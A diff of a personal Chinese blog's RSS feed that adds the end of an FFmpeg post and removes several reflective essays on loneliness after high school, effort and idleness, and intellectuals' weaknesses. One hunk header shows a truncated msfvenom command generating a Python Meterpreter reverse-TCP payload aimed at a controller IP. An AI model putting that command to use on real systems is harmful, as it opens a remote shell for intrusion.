+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/09/FFmpeg/&quot;&gt; FFmpeg &lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Mon, 12 Sep 2022 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2022/09/FFmpeg/</link>
+      <guid isPermaLink="true">http://localhost:4000/2022/09/FFmpeg/</guid>
+        
+      <category>技术</category>
+        
+        
+    </item>
+    
+    <item>
       <title>我,为什么要努力?</title>
       <description>&lt;h3 id=&quot;我变成荒凉的景象-变成无所谓的模样&quot;&gt;我变成荒凉的景象 变成无所谓的模样&lt;/h3&gt;
 
@@ -664,346 +1098,6 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
       <pubDate>Sat, 21 May 2022 00:00:00 +0800</pubDate>
       <link>http://localhost:4000/2022/05/%E4%B8%80%E7%82%B9%E5%8D%B1%E9%99%A9%E7%9A%84%E6%84%9F%E6%82%9F/</link>
       <guid isPermaLink="true">http://localhost:4000/2022/05/%E4%B8%80%E7%82%B9%E5%8D%B1%E9%99%A9%E7%9A%84%E6%84%9F%E6%82%9F/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>在社会的什么时候让你突然怀念高中生活</title>
-      <description>&lt;h3 id=&quot;春天的风给人以心旷神怡的状态&quot;&gt;春天的风给人以心旷神怡的状态。&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;1&lt;/p&gt;
-
-&lt;p&gt;每天的大多数时间我都无所事事。&lt;/p&gt;
-
-&lt;p&gt;有一天我在出租屋里睡到很晚，睡得天昏地暗。&lt;/p&gt;
-
-&lt;p&gt;迷迷糊糊不知过了多久，再次醒来的时候，天色已经渐渐地黯淡下去了。&lt;/p&gt;
-
-&lt;p&gt;用冷水冲一冲脸，强行让自己清醒过来。&lt;/p&gt;
-
-&lt;p&gt;不足十平米的出租屋空荡荡的，三室一厅安安静静。&lt;/p&gt;
-
-&lt;p&gt;拉开窗帘，打开窗子，吹一吹春天的风，高处的风景视野还是很开阔的。&lt;/p&gt;
-
-&lt;p&gt;我一时间有一种错觉。&lt;/p&gt;
-
-&lt;p&gt;好像我已经垂朽，风吹了我一次又一次。&lt;/p&gt;
-
-&lt;p&gt;我突然很难过，有种略微孤独的感觉。&lt;/p&gt;
-
-&lt;p&gt;2&lt;/p&gt;
-
-&lt;p&gt;每天傍晚的时候，就是北京城里最热闹的时候。&lt;/p&gt;
-
-&lt;p&gt;众鸟归巢，下班的他们陆续奔向餐馆、夜市、商超、睡城。&lt;/p&gt;
-
-&lt;p&gt;夕阳最后的一抹余晖洒在街头，人群熙熙攘攘，情侣们手挽着手并肩走在街头，夕阳将他们的肩头染成金色，渐行渐远，留下惹人遐想的背影。&lt;/p&gt;
-
-&lt;p&gt;这个时候街边的小摊最为热闹了，仿若大地迎来了春天，万花齐放。&lt;/p&gt;
-
-&lt;p&gt;有人驻足观察，想要看到最美好的晚餐。&lt;/p&gt;
-
-&lt;p&gt;有人行色匆匆，骑着自行车一骑绝尘。&lt;/p&gt;
-
-&lt;p&gt;有各种各样的人，经历着各种各样的人生，在这样一个黄昏里相遇，又擦肩而过。&lt;/p&gt;
-
-&lt;p&gt;我站在街角处，看着远方川流不息的人群，有时候觉得生活近在咫尺，又远在天边。&lt;/p&gt;
-
-&lt;p&gt;我想起高三的时候，下午下课是我们最快乐的时候，大家一拥而上冲进食堂，仿佛有千军万马在奔腾，所有人朝着一个方向狂奔。&lt;/p&gt;
-
-&lt;p&gt;有男生成群结队打打闹闹，也有女孩子三三两两聊着八卦……&lt;/p&gt;
-
-&lt;p&gt;青春又张扬。&lt;/p&gt;
-
-&lt;p&gt;黄昏的北京慵懒又繁忙。&lt;/p&gt;
-
-&lt;p&gt;每个人都看起来那么陌生，在这偌大的城市里，与他人的联系若隐若现，气若游丝。&lt;/p&gt;
-
-&lt;p&gt;每个人都像一座孤岛，漂浮在无边无际的大海。&lt;/p&gt;
-
-&lt;p&gt;3&lt;/p&gt;
-
-&lt;p&gt;公司一般都是9点上班的。&lt;/p&gt;
-
-&lt;p&gt;所以很多时候我一睁眼，世界已经很亮了。&lt;/p&gt;
-
-&lt;p&gt;突然回忆起那年高三冬天的时候，&lt;/p&gt;
-
-&lt;p&gt;六点钟的星星是很明亮的，教学楼已经灯火通明了。&lt;/p&gt;
-
-&lt;p&gt;而我，已经好多年没有看到六点的星星了。&lt;/p&gt;
-
-&lt;p&gt;公司里的同事认全是很难的。&lt;/p&gt;
-
-&lt;p&gt;大家有着不同的分工，走着不同的生活轨迹。&lt;/p&gt;
-
-&lt;p&gt;很多时候我都是一个人。&lt;/p&gt;
-
-&lt;p&gt;一个人吃饭，一个人拿快递，一个人公交地铁。&lt;/p&gt;
-
-&lt;p&gt;一个人为自己的未来纸上谈兵。&lt;/p&gt;
-
-&lt;p&gt;我怀念那年高三大家看着热血的视频彼此加油打气，一起并肩走向远方。&lt;/p&gt;
-
-&lt;p&gt;大家一起喊着：&lt;/p&gt;
-
-&lt;p&gt;高考必胜！&lt;/p&gt;
-
-&lt;p&gt;那是我们青春最张扬的模样。&lt;/p&gt;
-
-&lt;p&gt;到了社会我们似乎再没有那样的一腔孤勇。&lt;/p&gt;
-
-&lt;p&gt;雄心被掩埋在平平淡淡的繁琐里。&lt;/p&gt;
-
-&lt;p&gt;柴米油盐侵蚀了朗朗壮志。&lt;/p&gt;
-
-&lt;p&gt;最后只好在梦里一遍又一遍回味当年的热血。&lt;/p&gt;
-
-&lt;p&gt;醉里挑灯看剑，梦回吹角连营。&lt;/p&gt;
-
-&lt;p&gt;梦回吹角连营。&lt;/p&gt;
-
-&lt;p&gt;……&lt;/p&gt;
-
-&lt;p&gt;4&lt;/p&gt;
-
-&lt;p&gt;在某一个瞬间，你会想起高三的日子。&lt;/p&gt;
-
-&lt;p&gt;仿佛有些东西跨越时空重叠在一起，带着岁月的山洪呼啸而来。&lt;/p&gt;
-
-&lt;p&gt;它也许是熙熙攘攘的人群，也许是某句悠扬着的歌词。&lt;/p&gt;
-
-&lt;p&gt;让你回忆起那年高三的岁月，回忆起从前的人。&lt;/p&gt;
-
-&lt;p&gt;社会太大，大得让我有些喘不过气来。&lt;/p&gt;
-
-&lt;p&gt;我从未如此自由，又为何会如此孤单？&lt;/p&gt;
-
-&lt;p&gt;当我站在现在去回望高三，觉得它那么短。&lt;/p&gt;
-
-&lt;p&gt;仿佛只是睡了一个简短的午觉，青春就潦倒地关上了大门。&lt;/p&gt;
-
-&lt;p&gt;多想真的只是睡了一个很悠远的午觉，醒来的时候老师在黑板上演算题目，周围人稀里哗啦翻着课本，班主任在后门和蔼的看着我……&lt;/p&gt;
-
-&lt;p&gt;然而在我身处其中的时候，却觉得它那么漫长，好像过了一辈子那么久。&lt;/p&gt;
-
-&lt;p&gt;原来感觉是会变化的，就像我曾经喜欢早上的太阳，现在喜欢晚上的月亮。&lt;/p&gt;
-
-&lt;p&gt;那时候我憧憬大学，憧憬社会，憧憬自由。&lt;/p&gt;
-
-&lt;p&gt;如今当我身处偌大的社会。&lt;/p&gt;
-
-&lt;p&gt;身边人流如织，数不清的人穿过。&lt;/p&gt;
-
-&lt;p&gt;我低着头慢慢走过。&lt;/p&gt;
-
-&lt;p&gt;他们身上有数不清的故事……&lt;/p&gt;
-
-&lt;p&gt;人们按照自己的人生轨迹固执地走下去，也许我们曾无数次地相遇，却从未多看彼此一眼。&lt;/p&gt;
-
-&lt;p&gt;就那样毫无波澜地错身而过，成为不会有交点的平行线。&lt;/p&gt;
-
-&lt;p&gt;在这个永远熙熙攘攘的社会里，我们来自五湖四海，成为彼此人生里的过客。&lt;/p&gt;
-
-&lt;p&gt;5&lt;/p&gt;
-
-&lt;p&gt;高三是一群人的高三，人们搀扶着走向远方。&lt;/p&gt;
-
-&lt;p&gt;社会是一个人的社会，&lt;/p&gt;
-
-&lt;p&gt;我们用孤独，去交换了成长。&lt;/p&gt;
-
-&lt;p&gt;成长，是人生必经的溃烂。&lt;/p&gt;
-
-&lt;p&gt;6&lt;/p&gt;
-
-&lt;p&gt;废寝忘食，可以形容我，而它，此时却是一个贬义词。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/03/在社会的什么时候让你突然怀念高中生活/&quot;&gt; 在社会的什么时候让你突然怀念高中生活 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Mon, 07 Mar 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/03/%E5%9C%A8%E7%A4%BE%E4%BC%9A%E7%9A%84%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E8%AE%A9%E4%BD%A0%E7%AA%81%E7%84%B6%E6%80%80%E5%BF%B5%E9%AB%98%E4%B8%AD%E7%94%9F%E6%B4%BB/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/03/%E5%9C%A8%E7%A4%BE%E4%BC%9A%E7%9A%84%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E8%AE%A9%E4%BD%A0%E7%AA%81%E7%84%B6%E6%80%80%E5%BF%B5%E9%AB%98%E4%B8%AD%E7%94%9F%E6%B4%BB/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>行动与思想，曾经与现在</title>
-      <description>&lt;h3 id=&quot;所站之处既是太阳落下的地方&quot;&gt;所站之处，既是太阳落下的地方。&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;我曾经有一个朋友，我称他为巨人。&lt;/p&gt;
-
-&lt;p&gt;他每天早出晚归，在图书馆，在自习室。&lt;/p&gt;
-
-&lt;p&gt;现在我开始自嘲为矮子。&lt;/p&gt;
-
-&lt;p&gt;每天的主要活动就是在床上躺着，一躺就是一整天，如果躺累了……那就换一个姿势。&lt;/p&gt;
-
-&lt;p&gt;朋友巨人喜欢读书、写作、敲代码。我喜欢玩游戏、刷抖音，这种短暂的快感能很好的满足我日渐衰弱的脑子。&lt;/p&gt;
-
-&lt;p&gt;朋友巨人好为人师，每天看到我还在床上就恨铁不成钢，总是要“阴阳怪气”一番。&lt;/p&gt;
-
-&lt;p&gt;我不想搭理他，人生短短几十年，怎么过不是过呢，我就喜欢躺在床上，无拘无束。&lt;/p&gt;
-
-&lt;p&gt;朋友巨人努力好学，与我格格不入，书读的多的离谱，我偶尔也会感到妒忌，毕竟读书是一件很伟大的事。&lt;/p&gt;
-
-&lt;p&gt;我也不是没想过奋发图强，朝着自己的目标前进，这么大的人了，谁还没有个目标呢？但是为啥要苦了自己呢？是游戏快感不足，还是小姐姐不漂亮呢？所以，没有人比我更懂梦想，所谓梦想，就是梦里想想。&lt;/p&gt;
-
-&lt;p&gt;说到梦想，巨人朋友的梦想是建立一家伟大的科技公司，有一个改变世界的产品。每当巨人提及这个梦想的时候，我总是要冷嘲热讽一下，彰显一下自己为数不多的存在感。&lt;/p&gt;
-
-&lt;p&gt;我早就明白巨人与我不是一路人，但他总是劝解我，努力才是正途。我只笑笑不说话。&lt;/p&gt;
-
-&lt;p&gt;今天，又是没有工作快乐躺尸的一天，睁眼已经是十一点。我想叫个外卖，想想算了，饿一会吧。&lt;/p&gt;
-
-&lt;p&gt;环顾四周，只有朋友床头的铭牌“思想”被风吹的叮叮当当。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/01/行动与思想，曾经与现在/&quot;&gt; 行动与思想，曾经与现在 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Fri, 21 Jan 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/01/%E8%A1%8C%E5%8A%A8%E4%B8%8E%E6%80%9D%E6%83%B3-%E6%9B%BE%E7%BB%8F%E4%B8%8E%E7%8E%B0%E5%9C%A8/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/01/%E8%A1%8C%E5%8A%A8%E4%B8%8E%E6%80%9D%E6%83%B3-%E6%9B%BE%E7%BB%8F%E4%B8%8E%E7%8E%B0%E5%9C%A8/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>所谓书生气的弱点</title>
-      <description>&lt;h3 id=&quot;人的本性在于求知--亚里士多德&quot;&gt;人的本性在于求知 – 亚里士多德&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;知识分子的最大弱点是什么&quot;&gt;知识分子的最大弱点是什么？&lt;/h2&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;书读得越多，嫌弃的东西越多。&lt;br /&gt;
-嫌弃体力劳动的脏和累，嫌弃人际交往中的客套和虚伪。&lt;br /&gt;
-商人的小聪明、斤斤计较，看不上；&lt;br /&gt;
-政客的满嘴套话、空话，看不惯；&lt;br /&gt;
-普通大众的平庸、市井，看不起。&lt;br /&gt;
-社会各个阶层都有鄙视的理由，骨子里高全世界一等，常年活在云彩里。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;对他人的评价标准极其单一。&lt;br /&gt;
-读书的时候，只看学习成绩；做研究的时候，只看发表文章。&lt;br /&gt;
-把对业务能力的评价扩大到各个方面，甚至是性格、人品、人生价值。&lt;br /&gt;
-本科学校不好，这个人不行；硕士期间没发过SCI，这个人不行；博士所在科研组不牛，这个人不行；读完博士转行，这个人不行…… &lt;br /&gt;
-时至今日，我都记得学长在大一就给我们灌输的一个理念：学习不能肯定一切，却可以否定一切。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;理想模型看多了，习惯性对这个世界做各种不切实际的简化，想的问题都是“真空中的球形鸡”。&lt;br /&gt;
-试图量化一切事物，严重依赖标准，并且天真地认为其他人都会按标准执行。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;为什么说上述是弱点，因为中国的知识分子从来不是规则的制定者。&lt;br /&gt;
-制定规则的人，往往就通过这些弱点来利用知识分子。&lt;br /&gt;
-你清高是吧？那就给你虚名，钱就少赚点；&lt;br /&gt;
-你只重视业务能力是吧？那就僧多粥少让你们为了几篇文章，几个晋升名额打得死去活来；&lt;br /&gt;
-你理想主义遵守规则是吧？那就明确标准：海外top100名校博士，三年博士后经验，顶刊一作x篇。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;为什么你要那么努力&quot;&gt;为什么你要那么努力？&lt;/h2&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;因为我从小就知道自己的弱点：矫情、脆弱、受不了委屈。&lt;/p&gt;
-
-&lt;p&gt;我小时候很喜欢观察大人，对于每一个我见过的大人，我都会问自己一个问题：我以后要活成这个样子吗？而对于绝大部分大人，我的答案都是否定的。他们的人生太苦了！那时候我想象自己以后长大如果受跟他们一样的苦，我一定活不下去，因为我这人就是受不得一点委屈。&lt;/p&gt;
-
-&lt;p&gt;我受不了因为在小城市生活而不得不面对亲戚间勾心斗角、互相算计的委屈；&lt;/p&gt;
-
-&lt;p&gt;我受不了为了赚钱做自己不喜欢做的事情的委屈；&lt;/p&gt;
-
-&lt;p&gt;我受不了为了省钱牺牲生活质量的委屈；&lt;/p&gt;
-
-&lt;p&gt;我受不了从事任何体力劳动工作的委屈；&lt;/p&gt;
-
-&lt;p&gt;是受不了我的伴侣是一个没有品味、没有文化、不懂爱情的人的委屈；&lt;/p&gt;
-
-&lt;p&gt;我受不了身处于身边人都是眼界短、格局低、办事low这样的阶层的委屈。&lt;/p&gt;
-
-&lt;p&gt;所以，我从小就知道我要非常努力，只有我足够强大、足够独立、足够优秀，才能躲开上面这些委屈。&lt;/p&gt;
-
-&lt;p&gt;我的内心是一个矫情、脆弱的小男生，我不努力怎么保护他？&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;摘自知乎作者 Vincent Miniz&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;没有书生的气质，却患了书生的毛病。&lt;br /&gt;
-不想受这样的委屈，却吃不了努力的苦。&lt;br /&gt;
-总以为这个世界是”讲道理的“。&lt;br /&gt;
-我该如何保护他，刘清扬。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/01/所谓书生气的弱点/&quot;&gt; 所谓书生气的弱点 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Fri, 14 Jan 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/01/%E6%89%80%E8%B0%93%E4%B9%A6%E7%94%9F%E6%B0%94%E7%9A%84%E5%BC%B1%E7%82%B9/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/01/%E6%89%80%E8%B0%93%E4%B9%A6%E7%94%9F%E6%B0%94%E7%9A%84%E5%BC%B1%E7%82%B9/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>我的2021年终总结</title>
-      <description>&lt;h3 id=&quot;我好像失去了什么又似乎什么也没有拥有过&quot;&gt;我好像失去了什么，又似乎什么也没有拥有过。&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-今天是2021年的最后一天，又到了写年终总结的时候了，我似乎没写过哎，哪里来的又？依稀记得去年看到他人写的年终总结，也想总结一下，可是提笔了很长时间，却没有什么可写的。&lt;/p&gt;
-
-&lt;p&gt;一年已终，了无建树。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/01/我的2021年终总结/&quot;&gt; 我的2021年终总结 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Sat, 01 Jan 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/01/%E6%88%91%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/01/%E6%88%91%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
         
       <category>人生</category>
         
